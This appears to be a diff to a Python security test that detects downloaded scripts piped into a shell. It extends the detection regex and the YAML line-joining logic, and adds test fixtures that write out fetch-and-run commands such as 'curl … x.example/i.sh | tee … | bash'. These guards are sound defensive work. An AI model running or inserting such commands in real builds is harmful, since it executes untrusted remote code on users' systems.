@@ -44,8 +44,12 @@ INSTALLER_FILES = (
 # The wrapper run is `-`-prefixed flags and known exec wrappers only, never arbitrary words:
 # allowing any word made `curl … | grep bash` match, where the shell name is an ARGUMENT being
 # searched for rather than the command being run.
+#
+# `[^\n]*?` rather than `[^|]*` between the fetch and the pipe: a pipeline may pass through
+# intermediate stages first (`curl … | tee /tmp/i.sh | bash`), and stopping at the first `|`
+# made the guard blind to every such spelling. Lazy, so it still prefers the nearest match.
 PIPE_TO_SHELL = re.compile(
-    r"(?:curl|wget)[^|]*\|\s*"  # a network fetch piped onward
+    r"(?:curl|wget)\b[^\n]*?\|\s*"  # a network fetch piped onward, possibly via other stages
     r"(?:(?:sudo|env|xargs|nohup|exec|command|-\S+)\s+)*"  # exec wrappers and their flags
     r"(?:[\w./-]*/)?"  # optional path on the shell: /bin/, /usr/bin/
     r"(?:ba|z|k|da)?sh(?![\w.-])"  # sh, bash, zsh, ksh, dash -- as the COMMAND
@@ -94,17 +98,24 @@ def _logical_lines(text: str) -> list[str]:
         # Treating the stripped-empty line as a terminator would drop the join.
         if pending and not code:
             continue
+        # Fold BACKWARD first. A line STARTING with an operator continues the one above it (YAML
+        # folded scalars put the `|` at the head of the next physical line, not the tail of this
+        # one), and it may ALSO end in a continuer -- `| tee /tmp/i.sh |` does both. Testing the
+        # trailing continuer first swallowed such a line into `pending`, leaving the `curl` above
+        # it stranded on its own logical line with the `bash` below it: the pipe-to-shell split
+        # across three physical lines and matched nothing.
+        if joined and not pending and code.lstrip().startswith(_LEADING_CONTINUERS):
+            joined[-1] = f"{joined[-1]} {code.strip()}"
+            # Re-enter the loop body's trailing-continuer logic against the merged line, so a
+            # line that folds backward AND continues forward keeps absorbing what follows.
+            if joined[-1].endswith(_CONTINUERS):
+                pending = joined.pop() + " "
+            continue
         if code.endswith("\\"):
             pending += code[:-1] + " "
             continue
         if code.endswith(_CONTINUERS):
             pending += code + " "
-            continue
-        # A line STARTING with an operator continues the one above it (YAML folded scalars put
-        # the `|` at the head of the next physical line, not the tail of this one). Fold it back
-        # onto the previous logical line rather than emitting it as its own.
-        if joined and not pending and code.lstrip().startswith(_LEADING_CONTINUERS):
-            joined[-1] = f"{joined[-1]} {code.strip()}"
             continue
         joined.append((pending + code).strip())
         pending = ""
@@ -156,6 +167,10 @@ def test_nothing_pipes_a_downloaded_script_into_a_shell(path: Path):
             'RUN sh -c "curl -sSL https://x.example/i.sh | bash"\n', id="inside-a-quoted-command"
         ),
         pytest.param("RUN curl -sSL https://x.example/i.sh | bash;\n", id="semicolon-terminated"),
+        # The shell need not be the FIRST stage after the fetch.
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | tee /tmp/i.sh | bash\n", id="multi-stage-pipe"
+        ),
     ],
 )
 def test_the_pipe_to_shell_guard_catches_what_it_claims_to(snippet: str, tmp_path: Path):
@@ -193,6 +208,26 @@ def test_the_guard_catches_a_piped_installer_written_as_a_yaml_block(block: str,
         "jobs:\n  j:\n    steps:\n      - run: "
         + block
         + "\n          curl -fsSL https://x.example/i.sh\n          | bash\n"
+    )
+
+    with pytest.raises(AssertionError, match="pipes a downloaded script into a shell"):
+        test_nothing_pipes_a_downloaded_script_into_a_shell(planted)
+
+
+def test_the_guard_catches_a_yaml_line_that_both_folds_back_and_continues_on(tmp_path: Path):
+    """`| tee /tmp/i.sh |` starts with an operator AND ends with one.
+
+    It has to fold backward onto the `curl` above it and keep absorbing the `bash` below it. An
+    earlier ordering tested the trailing continuer first, so the line was swallowed forward and
+    the fetch was left stranded on its own logical line: the pipe-to-shell split across three
+    physical lines and matched nothing.
+    """
+    planted = tmp_path / "wf.yml"
+    planted.write_text(
+        "jobs:\n  j:\n    steps:\n      - run: >\n"
+        "          curl -fsSL https://x.example/i.sh\n"
+        "          | tee /tmp/i.sh |\n"
+        "          bash\n"
     )
 
     with pytest.raises(AssertionError, match="pipes a downloaded script into a shell"):
